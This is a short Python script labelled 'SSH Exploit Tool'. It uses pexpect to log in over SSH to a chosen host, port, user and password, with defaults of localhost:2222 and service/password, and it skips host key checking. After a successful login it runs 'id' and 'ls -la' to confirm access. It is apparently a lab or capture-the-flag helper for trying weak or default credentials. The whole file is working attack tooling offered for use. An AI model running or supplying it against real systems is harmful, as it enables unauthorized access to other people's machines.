import argparse
import pexpect
import sys

# Default configuration
TARGET = "localhost"
PORT = 2222
USER = "service"
PASS = "password"

def exploit_ssh(target=TARGET, port=PORT, user=USER, password=PASS):
    print(f"[*] Testing SSH credentials on {target}:{port}...")
    print(f"[*] Attempting {user}:{password}...")
    
    try:
        cmd = f"ssh -p {port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user}@{target}"
        child = pexpect.spawn(cmd)
        
        # Expect password prompt
        idx = child.expect(['[Pp]assword:', pexpect.EOF, pexpect.TIMEOUT], timeout=15)
        
        if idx == 0:
            child.sendline(password)
            
            # Expect shell prompt
            prompt_idx = child.expect(['\$', '#', '[Pp]assword:', pexpect.EOF], timeout=10)
            
            if prompt_idx < 2:
                print(f"[+] Success! Logged in as {user}.")
                
                print("[*] Running 'id' and 'ls'...")
                child.sendline("id")
                child.expect(['\$', '#'])
                print(child.before.decode().strip())
                
                child.sendline("ls -la")
                child.expect(['\$', '#'])
                print(child.before.decode().strip())
                
                child.sendline("exit")
            else:
                print("[-] Login failed (incorrect password).")
        else:
            print("[-] Failed to reach password prompt (connection issue).")
            
    except Exception as e:
        print(f"[-] SSH exploit failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SSH Exploit Tool')
    parser.add_argument('--target', default=TARGET, help='Target host')
    parser.add_argument('--port', type=int, default=PORT, help='Target port')
    parser.add_argument('--user', default=USER, help='SSH username')
    parser.add_argument('--pass', dest='password', default=PASS, help='SSH password')
    args = parser.parse_args()
    
    exploit_ssh(args.target, args.port, args.user, args.password)
